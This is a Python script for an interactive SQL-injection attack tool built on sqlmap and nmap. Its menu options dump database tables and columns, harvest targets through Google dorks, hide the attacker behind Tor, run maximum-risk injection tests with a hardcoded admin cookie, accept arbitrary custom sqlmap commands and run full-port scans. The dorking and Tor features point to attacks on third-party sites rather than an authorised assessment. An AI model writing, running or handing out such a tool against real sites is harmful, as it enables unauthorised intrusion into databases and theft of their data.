import argparse
import subprocess
import logging
import requests
from sqlmap import sqlmap
from bs4 import BeautifulSoup

class SQLInjectionTester:
    def __init__(self):
        self.setup_logging()
        self.parser = self.setup_argument_parser()
        self.args = self.parser.parse_args()
        self.options = self.setup_options()

    def setup_logging(self):
        logging.basicConfig(filename='sql_injection_test.log', level=logging.INFO,
                            format='%(asctime)s - %(levelname)s - %(message)s')

    def setup_argument_parser(self):
        parser = argparse.ArgumentParser(description="Advanced SQL Injection Testing Tool")
        parser.add_argument('-u', '--url', help="Target URL to test")
        parser.add_argument('-f', '--file', help="File containing list of URLs to test")
        parser.add_argument('--dork', help="Google dork to use for finding targets")
        parser.add_argument('--tor', action='store_true', help="Use Tor for anonymity")
        parser.add_argument('--threads', type=int, default=1, help="Number of threads to use")
        parser.add_argument('--level', type=int, choices=range(1, 6), default=1, help="Level of tests to perform")
        parser.add_argument('--risk', type=int, choices=range(1, 4), default=1, help="Risk of tests to perform")
        parser.add_argument('--dbms', help="Specify the DBMS type")
        return parser

    def setup_options(self):
        return {
            '1': ('Basic SQL Injection Test', self.basic_sql_injection),
            '2': ('Use Request File', self.use_request_file),
            '3': ('Extract Database Data', self.extract_db_data),
            '4': ('Use Google Dork', self.use_google_dork),
            '5': ('Use Tor Network', self.use_tor),
            '6': ('Use Authentication', self.use_auth),
            '7': ('Test Multiple URLs', self.test_multiple_urls),
            '8': ('Use SSL', self.use_ssl),
            '9': ('Use Proxy', self.use_proxy),
            '10': ('Use Multiple Threads', self.use_threads),
            '11': ('Full Test Suite', self.full_test_suite),
            '12': ('Custom SQLMap Command', self.custom_sqlmap_command),
            '13': ('Perform Nmap Scan', self.perform_nmap_scan),
            '14': ('Web Crawling', self.web_crawling)
        }

    def run_sqlmap(self, command):
        try:
            print(f"Executing command: {' '.join(command)}")
            result = subprocess.run(command, check=True, capture_output=True, text=True)
            print("SQLMap output:")
            print(result.stdout)
            logging.info(f"SQLMap command executed successfully: {' '.join(command)}")
        except subprocess.CalledProcessError as e:
            print("SQLMap error output:")
            print(e.stderr)
            logging.error(f"SQLMap command failed: {' '.join(command)}")
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            logging.error(f"Error running SQLMap: {str(e)}")

    def basic_sql_injection(self):
        print("Starting basic SQL injection test...")
        self.run_sqlmap(["sqlmap", "-u", self.args.url, "--batch"])
        print("SQL injection test completed.")

    def use_request_file(self):
        file_path = input("Enter the path to the request file: ")
        self.run_sqlmap(["sqlmap", "-r", file_path, "--batch"])

    def extract_db_data(self):
        dbname = input("Enter database name: ")
        tablename = input("Enter table name: ")
        columnname = input("Enter column name: ")
        self.run_sqlmap(["sqlmap", "-u", self.args.url, "-D", dbname, "-T", tablename, "-C", columnname, "--dump"])

    def use_google_dork(self):
        dork = input("Enter Google dork: ") if not self.args.dork else self.args.dork
        self.run_sqlmap(["sqlmap", "-g", dork, "--batch"])

    def use_tor(self):
        self.run_sqlmap(["sqlmap", "-u", self.args.url, "--tor", "--check-tor"])

    def use_auth(self):
        auth_type = input("Enter auth type (e.g., BASIC, DIGEST): ")
        username = input("Enter username: ")
        password = input("Enter password: ")
        self.run_sqlmap(["sqlmap", "-u", self.args.url, f"--auth-type={auth_type}", f"--auth-cred={username}:{password}", "--batch"])

    def test_multiple_urls(self):
        file_path = input("Enter the path to the file containing URLs: ")
        self.run_sqlmap(["sqlmap", "-m", file_path, "--batch"])

    def use_ssl(self):
        self.run_sqlmap(["sqlmap", "-u", self.args.url, "--ssl", "--ignore-ssl-errors"])

    def use_proxy(self):
        proxy = input("Enter proxy URL (e.g., http://127.0.0.1:8080): ")
        self.run_sqlmap(["sqlmap", "-u", self.args.url, f"--proxy={proxy}", "--batch"])

    def use_threads(self):
        threads = input("Enter number of threads: ")
        self.run_sqlmap(["sqlmap", "-u", self.args.url, f"--threads={threads}", "--batch"])

    def full_test_suite(self):
        self.run_sqlmap([
            "sqlmap", "-u", self.args.url, "--level=5", "--risk=3",
            "--cookie=user=admin;password=pass", "--dbms=MySQL", "--os=Linux",
            "--current-user", "--current-db", "--hostname", "--timeout=10",
            "--fresh-queries", "--hex", "--output-format=csv", "--batch"
        ])

    def custom_sqlmap_command(self):
        command = input("Enter custom SQLMap command (without 'sqlmap'): ")
        self.run_sqlmap(["sqlmap"] + command.split())

    def perform_nmap_scan(self):
        domain = self.args.url.split("//")[-1].split("/")[0]
        command = ["nmap", "-sV", "-p-", "--script=http-sql-injection", domain]
        
        try:
            result = subprocess.run(command, capture_output=True, text=True, check=True)
            logging.info(f"Nmap scan completed for {domain}")
            print(result.stdout)
        except subprocess.CalledProcessError:
            logging.error(f"Nmap scan failed for {domain}")

    def web_crawling(self):
        try:
            response = requests.get(self.args.url)
            soup = BeautifulSoup(response.text, 'html.parser')
            links = soup.find_all('a')
            
            for link in links:
                href = link.get('href')
                if href and href.startswith('http'):
                    print(f"Found link: {href}")
                    
        except requests.RequestException as e:
            logging.error(f"Web crawling failed: {str(e)}")

    def main(self):
        if not (self.args.url or self.args.file or self.args.dork):
            self.args.url = input("Enter the URL to test for SQL injection: ")

        print("Available options:")
        
        for key, (description, _) in sorted(self.options.items()):
            print(f"{key}. {description}")

        choice = input("Enter your choice: ")

        if choice in self.options:

            try:
                print(f"Executing option {choice}: {self.options[choice][0]}")
                self.options[choice][1]()  
                print(f"Completed option {choice}.")
                
            except Exception as e:
                print(f"An error occurred while executing option {choice}: {e}")
                logging.error(f"Error executing option {choice}: {e}")
                
        else:
            print("Invalid option")

if __name__ == "__main__":
    SQLInjectionTester().main()
